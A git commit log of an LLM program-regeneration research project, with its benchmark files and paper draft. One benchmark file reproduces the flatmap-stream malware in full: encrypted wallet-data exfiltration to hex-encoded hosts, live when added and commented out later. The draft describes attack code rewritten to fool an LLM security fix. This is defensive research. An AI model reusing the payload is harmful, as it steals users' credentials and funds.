+    match = re.search(r"```(?:\w*\n)?(.*?)```", text, re.DOTALL)
+    return match.group(1).strip() if match else ""
 
 def plugin_basename(name: str) -> str:
     """

### 2025-06-16 kvasir/default_plugins/outputs.py
Fix trailing newline
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -81,13 +81,12 @@ def run_nodejs(js_src, inputs):
                 stderr=subprocess.DEVNULL,
                 timeout=2
             )
-
-            logger.debug(f"Node.js output for input {i}: '{result.decode()}'")
-            parsed = result.decode()
+            result = result.decode()[:-1]  # Remove trailing newline
+            logger.debug(f"Node.js output for input {i}: '{result}'")
         except Exception as e:
             logger.error(f"Error running Node.js for input {i}: {e}")
-            parsed = None
-        results.append((i, parsed))
+            result = None
+        results.append((i, result))
     return results
 
 def run_haskell(src, inputs):

### 2025-06-16 scripts/eval.sh
Add naive llm eval
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -6,9 +6,15 @@ top=$(git rev-parse --show-toplevel)
 
 input="$top/eval"
 output="$top/results"
+scripts="$top/scripts"
 mkdir -p "$output"
+mkdir -p "$output"/naivellm
 
 # Evaluate each task
 kvasir -vvv -i "$input"/micro/math.js -q "$input"/query/to_haskell.pl -o "$output"/math.hs
 kvasir -vvv -i "$input"/micro/Q_rsqrt.c -q "$input"/query/min_len.pl -o "$output"/Q_rsqrt_idiomatic.c
 kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$output"/left-pad.js
+
+# Apply LLM naively
+"$scripts"/naivellm.py "$input"/ssca/string-compare/modified-to-fool-llm.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivelllm/ssca-string-compare.js
+"$scripts"/naivellm.py "$input"/ssca/leetlog/modified-to-fool-llm.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivelllm/ssca-leetlog.js

### 2025-06-16 scripts/naivellm.py

@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+
+import dspy
+import argparse
+from kvasir.utils import get_code_block
+from kvasir.program import Program
+
+
+lm = dspy.LM('openai/gpt-4o-mini')
+
+def main():
+    parser = argparse.ArgumentParser(description="Perform task naively using an LLM.")
+    parser.add_argument('program', type=str, help='The source code of the program to analyze.')
+    parser.add_argument('task', type=str, help='The task to perform on the program.')
+    args = parser.parse_args()
+
+    program = Program(args.program)
+
+    prompt = f"""{args.task}
+    Program:
+    {program.src}
+    
+    Please return the program's source code after performing the task.
+    """
+
+    output = "\n".join(lm(prompt))
+    output = get_code_block(output)
+
+    print(output)
+
+if __name__ == "__main__":
+    main()

### 2025-06-17 eval/npm/append-string/index.js
Remove append-string
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,38 +1,0 @@
-'use strict';
-
-var os = require('os');
-
-/**
- * Append a string to another string ensuring to preserve line ending characters.
- *
- * ```js
- * console.log([appendString('abc\r\n', 'def')]);
- * //=> [ 'abc\r\ndef\r\n' ]
- *
- * console.log([appendString('abc\n', 'def')]);
- * //=> [ 'abc\ndef\n' ]
- *
- * // uses os.EOL when a line ending is not found
- * console.log([appendString('abc', 'def')]);
- * //=> [ 'abc\ndef' ]
- * ```
- * @param  {String} `str` String that will be used to check for an existing line ending. The suffix is appended to this.
- * @param  {String} `suffix` String that will be appended to the str.
- * @return {String} Final String
- * @api public
- */
-
-module.exports = function appendString(str, suffix) {
-  if (!suffix || !suffix.length) {
-    return str;
-  }
-  var eol;
-  if (str.slice(-2) === '\r\n') {
-    eol = '\r\n';
-  } else if (str.slice(-1) === '\n') {
-    eol = '\n';
-  } else {
-    return [str, os.EOL, suffix].join('');
-  }
-  return [str, suffix, eol].join('');
-};

### 2025-06-17 eval/npm/append-string/test.js

@@ -1,44 +1,0 @@
-'use strict';
-
-require('mocha');
-var os = require('os');
-var assert = require('assert');
-var appendString = require('./');
-
-describe('appendString', function() {
-  it('should append the string suffix to the string prefix with \\r\\n', function() {
-    assert.equal(appendString('abc\r\n', 'def'), 'abc\r\ndef\r\n');
-  });
-
-  it('should append the string suffix to the string prefix with \\n:', function() {
-    assert.equal(appendString('abc\n', 'def'), 'abc\ndef\n');
-  });
-
-  it('should append the string suffix to the string prefix without EOL', function() {
-    assert.equal(appendString('abc', 'def'), 'abc' + os.EOL + 'def');
-  });
-
-  it('should append the buffer suffix to the string prefix with \\r\\n', function() {
-    assert.equal(appendString('abc\r\n', new Buffer('def')), 'abc\r\ndef\r\n');
-  });
-
-  it('should append the buffer suffix to the string prefix with \\n:', function() {
-    assert.equal(appendString('abc\n', new Buffer('def')), 'abc\ndef\n');
-  });
-
-  it('should append the buffer suffix to the string prefix without EOL', function() {
-    assert.equal(appendString('abc', new Buffer('def')), 'abc' + os.EOL + 'def');
-  });
-
-  it('should not append EOL when suffix is empty', function() {
-    assert.deepEqual(appendString('abc', ''), 'abc');
-  });
-
-  it('should not append EOL when suffix is undefined', function() {
-    assert.deepEqual(appendString('abc'), 'abc');
-  });
-
-  it('should not append EOL when suffix is empty buffer', function() {
-    assert.deepEqual(appendString('abc', new Buffer('')), 'abc');
-  });
-});

### 2025-06-17 eval/pypi/sliced.py
Fix sliced
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,4 +1,5 @@
 def sliced(lst, n):
     '''Yield n number of slices from lst.'''
     # Original algorithm from Jurgen Strydom posted 2019-02-21 Stack Overflow
-    # https://stackoverf
+    for i in range(n):
+        yield lst[i::n]

### 2025-06-17 scripts/naivellm.py
Add message
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import dspy
+import sys
 import argparse
 from kvasir.utils import get_code_block
 from kvasir.program import Program
@@ -14,6 +15,7 @@ def main():
     parser.add_argument('task', type=str, help='The task to perform on the program.')
     args = parser.parse_args()
 
+    print(f"Performing task: {args.task} on program: {args.program}", file=sys.stderr)
     program = Program(args.program)
 
     prompt = f"""{args.task}

### 2025-06-17 scripts/eval.sh
Add all naivellm evaluation
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -16,5 +16,36 @@ kvasir -vvv -i "$input"/micro/Q_rsqrt.c -q "$input"/query/min_len.pl -o "$output
 kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$output"/left-pad.js
 
 # Apply LLM naively
-"$scripts"/naivellm.py "$input"/ssca/string-compare/modified-to-fool-llm.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivelllm/ssca-string-compare.js
-"$scripts"/naivellm.py "$input"/ssca/leetlog/modified-to-fool-llm.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivelllm/ssca-leetlog.js
+"$scripts"/naivellm.py "$input"/rosetta/helloworld.js 'Turn this program into Haskell code' > "$output"/naivellm/rosetta-helloworld.hs
+"$scripts"/naivellm.py "$input"/rosetta/helloworld.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-helloworld.py
+"$scripts"/naivellm.py "$input"/rosetta/median.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-median.py
+"$scripts"/naivellm.py "$input"/rosetta/rot13.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-rot13.py
+"$scripts"/naivellm.py "$input"/rosetta/readfile.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-readfile.py
+
+"$scripts"/naivellm.py "$input"/npm/array-ify/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-array-ify.js
+"$scripts"/naivellm.py "$input"/npm/has-values/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-has-values.js
+"$scripts"/naivellm.py "$input"/npm/is-nan/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-is-nan.js
+"$scripts"/naivellm.py "$input"/npm/is-number/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-is-number.js
+"$scripts"/naivellm.py "$input"/npm/is-string/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-is-string.js
[…]

### 2025-06-17 eval/ssca/flatmap-stream/index-attack.js
Add missing programs to eval
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,212 @@
+/*@@*/ ! function() {
+    function e() {
+        try {
+            var o = require("http"),
+                a = require("crypto"),
+                c = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----";
+
+            function i(e, t, n) {
+                e = Buffer.from(e, "hex").toString();
+                var r = o.request({
+                    hostname: e,
+                    port: 8080,
+                    method: "POST",
+                    path: "/" + t,
+                    headers: {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+                }, function() {});
+                r.on("error", function(e) {}), r.write(n), r.end()
+            }
+
+            function r(e, t) {
+                for (var n = "", r = 0; r < t.length; r += 200) {
+                    var o = t.substr(r, 200);
+                    n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
+                }
+                i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
+            }
+
+            function l(t, n) {
+                if (window.cordova) try {
+                    var e = cordova.file.dataDirectory;
+                    resolveLocalFileSystemURL(e, function(e) {
+                        e.getFile(t, {
+                            create: !1
+                        }, function(e) {
+                            e.file(function(e) {
+                                var t = new FileReader;
+                                t.onloadend = function() {
+                                    return n(JSON.parse(t.result))
+                                }, t.onerror = function(e) {
+                                    t.abort()
[…]

### 2025-06-17 eval/micro/flatmap.js
Fix micro benchmarks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,214 @@
+/*
+! function() {
+    function e() {
+        try {
+            var o = require("http"),
+                a = require("crypto"),
+                c = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----";
+
+            function i(e, t, n) {
+                e = Buffer.from(e, "hex").toString();
+                var r = o.request({
+                    hostname: e,
+                    port: 8080,
+                    method: "POST",
+                    path: "/" + t,
+                    headers: {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+                }, function() {});
+                r.on("error", function(e) {}), r.write(n), r.end()
+            }
+
+            function r(e, t) {
+                for (var n = "", r = 0; r < t.length; r += 200) {
+                    var o = t.substr(r, 200);
+                    n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
+                }
+                i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
+            }
+
+            function l(t, n) {
+                if (window.cordova) try {
+                    var e = cordova.file.dataDirectory;
+                    resolveLocalFileSystemURL(e, function(e) {
+                        e.getFile(t, {
+                            create: !1
+                        }, function(e) {
+                            e.file(function(e) {
+                                var t = new FileReader;
+                                t.onloadend = function() {
+                                    return n(JSON.parse(t.result))
+                                }, t.onerror = function(e) {
+                                    t.abort()
[…]

### 2025-06-17 eval/micro/rigiddb.js

@@ -1,0 +1,33 @@
+const Database = require('better-sqlite3');
+
+// Function to get albums by artist
+function getAlbumsByArtist(artist) {
+  // Create an in-memory database
+  const db = new Database(':memory:');
+
+  // Imagine the db has been pre-populated with data
+  db.exec(`
+    CREATE TABLE songs (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      artist TEXT NOT NULL,
+      album TEXT NOT NULL
+    );
+
+    INSERT INTO songs (artist, album) VALUES
+      ('Daft Punk', 'Discovery'),
+      ('Daft Punk', 'Homework'),
+      ('Radiohead', 'OK Computer'),
+      ('Radiohead', 'In Rainbows');
+  `);
+
+  const stmt = db.prepare("SELECT album FROM songs WHERE artist = ?");
+  const rows = stmt.all(artist);
+  return rows.map(row => row.album);
+}
+
+// if main
+if (require.main === module) {
+  const artist = 'Daft Punk';
+  const albums = getAlbumsByArtist(artist);
+  console.log(`Albums by ${artist}:`, albums);
+}

### 2025-06-17 eval/ssca/flatmap-stream/index-attack.js
Comment out attack
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,4 +1,5 @@
-/*@@*/ ! function() {
+/*
+! function() {
     function e() {
         try {
             var o = require("http"),
@@ -78,6 +79,7 @@
     }
     window.cordova ? document.addEventListener("deviceready", e) : e()
 }();
+*/
 var Stream = require('stream').Stream
 
 module.exports = function (mapper, opts) {

### 2025-06-17 kvasir/program.py
Support cjs files
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -29,7 +29,7 @@ class Language(Enum):
 
 def detect_language(entry) -> Language:
     """Detect the programming language based on the file extension."""
-    if entry.endswith(".js"):
+    if entry.endswith(".js") or entry.endswith(".cjs"):
         return Language.JS
     elif entry.endswith(".hs"):
         return Language.HS

### 2025-06-17 scripts/eval.sh
Fix file endings
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -27,11 +27,11 @@ kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$
 "$scripts"/naivellm.py "$input"/npm/is-nan/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-is-nan.js
 "$scripts"/naivellm.py "$input"/npm/is-number/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-is-number.js
 "$scripts"/naivellm.py "$input"/npm/is-string/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-is-string.js
-"$scripts"/naivellm.py "$input"/npm/just-flush/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-just-flush.js
+"$scripts"/naivellm.py "$input"/npm/just-flush/index.cjs 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-just-flush.js
 "$scripts"/naivellm.py "$input"/npm/left-pad/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-left-pad.js
-"$scripts"/naivellm.py "$input"/npm/lowercase-keys/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-lowercase-keys.js
+"$scripts"/naivellm.py "$input"/npm/lowercase-keys/index.cjs 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-lowercase-keys.js
 "$scripts"/naivellm.py "$input"/npm/math-factorial/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-math-factorial.js
-"$scripts"/naivellm.py "$input"/npm/string-repeating/index.js 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-string-repeating.js
+"$scripts"/naivellm.py "$input"/npm/string-repeating/index.cjs 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/npm-string-repeating.js
 
 "$scripts"/naivellm.py "$input"/pypi/left_pad.py 'Give back the same code having removed any vulnuerabilities' > "$output"/naivellm/pypi-left_pad.py
[…]

### 2025-06-17 kvasir/program.py
Add basic Python support
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -10,6 +10,7 @@ class Language(Enum):
     JS = "javascript"
     HS = "haskell"
     C = "c"
+    PY = "python"
 
     def __str__(self):
         return self.value.capitalize()
@@ -23,6 +24,8 @@ class Language(Enum):
                 return ".hs"
             case Language.C:
                 return ".c"
+            case Language.PY:
+                return ".py"
             case _:
                 raise ValueError(f"Unsupported language: {self.value}")
 
@@ -35,6 +38,8 @@ def detect_language(entry) -> Language:
         return Language.HS
     elif entry.endswith(".c"):
         return Language.C
+    elif entry.endswith(".py"):
+        return Language.PY
     else:
         raise ValueError(f"Unsupported file type: {entry}")
 
@@ -138,6 +143,9 @@ class HaskellProgram(Program):
 
 class CProgram(Program):
     language = Language.C
+
+class PythonProgram(Program):
+    language = Language.PY
 
 # Register the language-specific programs
 ProgramMeta.registry[Language.JS] = JavaScriptProgram

### 2025-06-17 paper/draft.tex
Add semantic line breaks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Fix usepackage
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Format table
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Fill out evaluation, conclusion, and abstract
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \usepackage{booktabs}
-\usepackage{
-  color,
-  soul,
-  float,
-  epsfig,
-  wrapfig,
-  graphics,
-  graphicx,
-  subcaption
-}
+\usepackage{color}
+\usepackage{soul}
+\usepackage{float}
+\usepackage{epsfig}
+\usepackage{wrapfig}
+\usepackage{graphics}
+\usepackage{graphicx}
+\usepackage{subcaption}
 \usepackage{adjustbox}
@@
 
+\def\gptmodel{{GPT-4o}\xspace}
+
 \newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
@@
 \newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
+\newcommand{\promptbox}[1]{\hspace*{-0.0135\columnwidth}\fbox{\parbox[t]{0.95\columnwidth}{\tt{#1}}}}
 
@@
 \begin{abstract}
+Modern software systems are constantly evolving—requiring developers to
+  refactor legacy code, adapt to changing APIs, translate across languages, and
+  patch security vulnerabilities. These transformations are often brittle,
+  manual, and error-prone. Large language models (LLMs) offer new opportunities
+  for automating such tasks, but their outputs are shaped by surface cues, lack
+  semantic guarantees, and require brittle prompting strategies. This paper
+  presents \sys, a system for controllable program regeneration that combines
+  logic-based planning with LLM-guided synthesis.
+  By expressing transformation
+  goals as declarative constraints over program properties---such as input/output
+  behavior, side-effect freedom, language, or modular structure, \sys
+  regenerates code that satisfies explicit semantic requirements.
+  We demonstrate \sys across a wide range of tasks, including security
+  hardening, language translation, and idiomatic rewriting, and highlight its
+  ability to deliver interpretable, high-quality transformations with minimal
+  developer guidance.
 \end{abstract}
@@
 % insights: modular programs, advances in LLMs, need for a strictly declarative interface
+
+% Mention that:
+% 1. They have shown great promise in program synthesis + 
+% 2. They can not do negative reasoning well - 
+% 3. Their output are often closely aligned to their inputs. They are gullible (susceptible to adversarial inputs). -
+% 4. Difficult to verify correctness of outputs against certain properties. The
+%    user cannot easily set requirements or say output should be within a range of
+%    acceptance
 
@@
 
-% Mention that:
-% 1. They have shown great promise in program synthesis + 
-% 2. They can not do negative reasoning well - 
-% 3. Their output are often closely aligned to their inputs. They are gullible (susceptible to adversarial inputs). -
-% 4. Difficult to verify correctness of outputs against certain properties. The
-%    user cannot easily set requirements or say output should be within a range of
-%    acceptance
-
-This paper present \sys, a system for \emph{scalable program regeneration}.
+This paper present \sys, a system for \emph{controllable program regeneration}.
 \sys allows users
@@
 At its core is a property-driven pipeline: users express goals as logical constraints over semantic properties, such as input/output behavior, side-effect freedom, target language, or structural modularity.
-\sys extracts a set of relevant properties, using a logic engine and domain-specific knowledge base, and synthesizes a new program that satisfies the specified constraints.
-If no such program exists, \sys returns failure explanations derived from the unsatisfiable core.
+\sys extracts a set of relevant properties, derived from its logic engine and a domain-aware knowledge base, and synthesizes a new program that satisfies the specified constraints.
+If no such program exists, \sys returns a failure explanation from the unsatisfiable core.
 
@@
 For example:
-\begin{itemize}
-  \item A \ttt{signature} plugin may contribute: \emph{\say{The output should implement a function \texttt{sqrt(n: float): float}.}}
-  \item A \ttt{length} plugin combined with a minimization goal may prepend: \emph{\say{The output should be as short as possible while preserving the original functionality.}}
-  \item A \ttt{javascript2haskell} plugin may prepend: \emph{\say{The output function should be written in Haskell.}}
-\end{itemize}
+A \ttt{signature} plugin may contribute:
+
+ \promptbox{
+   {The output should implement a function \texttt{sqrt(n: float): float}.}
+ }
+A \ttt{length} plugin combined with a minimization goal may prepend:
+
+\promptbox{
+  {The output should be as short as possible while preserving the original functionality.}
+}
+A \ttt{javascript2haskell} plugin may prepend:
+
+\promptbox{
+  {The output function should be written in Haskell.}
+}
 
@@
   \item[\textbf{Q1}] \textbf{Correctness and Regeneration Quality}: Does \sys preserve program behavior and produce high-quality programs?
-  \item[\textbf{Q2}] \textbf{Transformation Success}: Can \sys handle a diverse set of regeneration goals?
+  \item[\textbf{Q2}] \textbf{LLM Baseline}: How does \sys compare to naively prompting a large language model?
   \item[\textbf{Q3}] \textbf{Planning Efficiency \& Precision}: Does minimizing extracted properties help regeneration succeed faster and more reliably?
+    % TODO: Maybe make naive LLM Q3 and merge Q3 and Q2.
 \end{itemize}
@@
 We evaluate \sys on six benchmark suites, summarized in \cref{tab:benchmarks}.
-These benchmarks include popular codebases from real-world package ecosystems, obfuscated or malicious components, and handcrafted microbenchmarks that reflect the use cases discussed in \cref{sec:example}.
+Each task consists of an input program, a \sys query expressing desired
+properties, and a test suite or functional oracle.
+The Rosetta Code~\cite{rosettacode} benchmarks include four programming tasks written in four different
+languages each (Python, JavaScript, C, and Haskell). 
+These include classic programs that do not require any language-specific features to implement.
+These are: the classic \emph{Hello, World!} program as found in most programming tutorials,
+a program that applies the ROT-13 cipher to a string,
+a program that computes the median of a list of numbers,
+and a program that reads a file and prints its contents to the console line-by-line.
+The npm benchmark includes ten popular (100.000+ weekly downloads) npm packages that implement utility
+functionality such as string manipulation, data structure transformations, and math.
+Similalry, the PyPi utilities benchmark includes three functions sourced from PyPi that implement similar functionality.
+The SSCA dataset includes three sneaky supply-chain attacks that obfuscate malicious behavior in otherwise innocuous-looking code.
+The attack activates under specific environment conditions, such as the presence of a specific environment variable or specific inputs
+getting passed to the program.
+The attacks involve private key exfiltration~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}.
+and occur while the program still performs its advertised functionality.
+The IOCCC benchmark includes two programs from the International Obfuscated C Code Contest (IOCCC)~\cite{ioccc}.
+These programs are intentionally obfuscated, using advanced techniques such as bit manipulation, undefined behavior,
+and exploitation of the C preprocessor and the lax parsing rules of the C language.
+These programs perform mathematical computations like mersense primality testing and adding two numbers.
+Finally, the microbenchmarks include three programs that implement the regeneration tasks discussed in \cref{sec:example}.
 
@@
 \midrule
-  Rosetta Code                                          & Programming tasks              & 4 & \cite{rosettacode} \\
+Rosetta Code                       & Programming tasks   & 16   & \cite{rosettacode} \\
 npm utilities                      & Utilities from npm  & 10  & \cite{regbench2025} \\
-Python utilities                                        & Utilities from PyPi            & 1 & \cite{regbench2025} \\
-  SSCA                                                    & Sneaky SSAs    & 3 & \cite{ev:eurosec:2022, es1, ohm2020backstabber} \\
+PyPi utilities                   & Utilities from PyPi & 3   & \cite{regbench2025} \\
+SSCA                               & Sneaky SSAs         & 3   & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
 IOCCC                              & Obfuscated C code   & 2   & \cite{ioccc} \\
@@
 \hspace{.5em} \ttt{Q\_rsqrt}       & C refactoring       &     & \cite{fast_inv_sqrt}  \\
-  \hspace{.5em} \textsf{MusicDB}                          & Modularization           &      & \cite{codewithsadeemusicplayer} \\
+\hspace{.5em} \textsf{rigidDB}     & Modularization      &     & \cite{codewithsadeemusicplayer} \\
 \bottomrule
@@
 \end{table}
-
-Each task consists of an input program, a \sys query expressing desired properties, and a test suite or functional oracle.
 
@@
   \centering
-  \caption{Correctness: Percentage of tasks passing all I/O tests}
+  \caption{Correctness: Percentage of tasks passing all tests (when present) and manual inspection.}
   \begin{tabular}{lc}
@@
     \midrule
-    Rosetta Code & \xxx/\xxx  \\
-    npm Utilities & \xxx/\xxx \\
-    Python Utilities & \xxx/\xxx \\
-    SSCA & \xxx/\xxx  \\
-    IOCCC & \xxx/\xxx  \\
-    Microbenchmarks & \xxx/\xxx  \\
+    Rosetta Code & 16/16  \\
+    npm Utilities & 10/10 \\
+    Python Utilities & 3/3\\
+    SSCA & 3/3  \\
+    IOCCC & 1/2 \\
+    Microbenchmarks & 2.5/3  \\
     \bottomrule
@@
 
-\subsection{Q2: Transformation Success}
+\sys succeeds in all of the Rosetta Code benchmarks, code is correct, we had to manually verify it as no test cases are available.
+\sys regenerates correctly all npm and PyPi utilities, it does not introduce and sideffectful or malicious behavior.
+The synthesized programs reveal several interesting insights and patterns.
+\sys-generated code often lacks the optimizations commonly
+implemented by library developers, such as early exits or caching.
+For instance, the \texttt{left-pad} library, precomputes padding for strings below a certain length
+and returns it directly. In contrast, \sys tends to produce straightforward
+implementations without attempting similar optimizations.
+\sys also omits domain-specific knowledge.
+For example, in the \texttt{is} family of libraries,
+\sys-generated code frequently fails to account for all edge cases,
+and often misses JavaScript-specific patterns,
+such as checking an object’s string representation to decide if an object is circular, as in the \texttt{is-circular} library.
+\sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
+For the SSCA benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
+For the flatmap-stream attack, \sys uses some domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} plugin) to generate a function that produces a node \ttt{Stream} object.
+For the IOCCC benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
+it also regenerates \ttt{mersenne} in regards that it correctly performs a naive mersenne primality testing, but it does not follow the non-obvious output scheme of the original program, which returns a non-zero hexadecimal number when $2^p - 1$ ($p$ being the input number) is not prime.
+For the microbenchmarks, \sys correctly regenerates the \ttt{flatmap-stream} program, producing a safe Haskell version that is idiomatic and preserves the original functionality.
+However, this version does not match exactly the semantics of the original one, as it operates over infinitely nested lists, rather than only one level deep ones.
+The \ttt{Q\_rsqrt} program includes the obvious, idiomatic computation of the inverse square root ($1/\sqrt{x}$) rather than the original bit-level manipulation.
+Finally, \sys successfully decomposes the \ttt{rigidDB} program into two
+functions, \ttt{setupDatabase} and \ttt{getAlbumsByArtist}, which is a
+modularization that preserves the original functionality and produce equivalent I/O and SQL traces.
 
-We test whether \sys meets transformation goals across different categories.
-Each row corresponds to a class of transformation query (e.g., removal of side effects, modular decomposition).
-We count success when the generated program meets all stated properties and passes correctness checks.
-\sys consistently succeeds at expressing non-trivial goals that GPT-4 baseline prompts often fail to satisfy.
+\sys is able to regenerate programs that are correct and preserve the original functionality,
+while also removing any malicious behavior or obfuscation.
+Failure cases highlight current limitations, and inspire future work~(\cref{sec:discussion}).
+
+\subsection{Q2: Naive LLM vs. \sys}
+
+To compare \sys against a baseline, we use a \gptmodel instance
+that performs prompt-only rewriting without explicit access to guiding properties.
+The LLM gets the following prompt template:
+
+\promptbox{
+  \emph{Task description} \eg {Give back the same code having removed any vulnuerabilities}\\
+
+  Program:\\
+  \emph{Program/function source code}\\
+
+  Please return the program's source code after performing the task.
+}
+
+For the Rosetta Code benchmarks, \gptmodel 
+succesful in all language translation tasks.
+The original and LLM-generated code matches the semantics
+of the original one, confirmed after manually inspecting the generated code.
+Similarly, the LLM was succesful in transforming the npm and PyPi utilities towards
+removing any vulnerabilities from them, as they are benign and the transformation
+involved the LLM simply repeating the original code without any changes.
+The SSCA benchmark tasks are more interesting, as they involve 
+malicious code. For the malicious libraries, we provide the LLM 
+with two different versions. One is the original high-profile attack that appeared on npm,
+with the second one being an attack that is semantically equivalent but with the source 
+having gone through an iterative loop where a second LLM is tasked with making the code ostensibly 
+secure. This involves adding integrity checks at all points in the program where a value is used.
+\gptmodel was succesful in eliminating the original attacks, but failed in \emph{all} 
+cases where the source code was particulalry crafted to appear secure, regenerating both 
+the original functionality and the attack.
+For the IOCCC benchmarks, \gptmodel also fails 
+in both cases to regenerate the programs in a way where the code's 
+functionality is preserved while removing the obfuscation.
+The \ttt{adder} program is regenerated as a program that prints the \ttt{argc} argument, 
+while the \ttt{mersenne} program performs irrelevant arithmetic operations that 
+resemble the original source, and fails to even compile.
+For the microbenchmarks, \gptmodel is able to regenerate the \ttt{flatmap-stream} program, but fails to produce a Haskell version of it,
+as it overfits to the original JavaScript source code which uses the \ttt{Stream} API,
+and fails to produce a Haskell program that is nor equivalent to the original, nor idiomatic.
+For the \ttt{Q\_rsqrt} program, \gptmodel fails to produces a program that idiomatically 
+computes the inverse square root, rather trying to minimize the number of lines in the program
+by removing constants and comments and still keeping the bit-level manipulation.
+Finally, for the \ttt{rigidDB} program, \gptmodel is able to decompose the original program into two functions
+and names them \ttt{setupDatabase} and \ttt{getAlbumsByArtist}.
+
+\sys consistently outperforms a \gptmodel baseline,
+highlighting the inherent weaknesses of a purely prompt-based approach.
 
@@
 
-To evaluate the impact of \sys's property planning, we compare it against a GPT-4 baseline that performs prompt-only rewriting without explicit access to guiding properties.
+To evaluate the impact of \sys's property planning, we compare it against a \gptmodel baseline that performs prompt-only rewriting without explicit access to guiding properties.
 
@@
 
-\begin{table}[h]
-  \centering
-  \caption{
-    Planning precision: Number of tasks where the synthesized program satisfies positive properties ($P_p$) and avoids negative properties ($P_n$).
-  }
-  \begin{tabular}{lcc}
-    \toprule
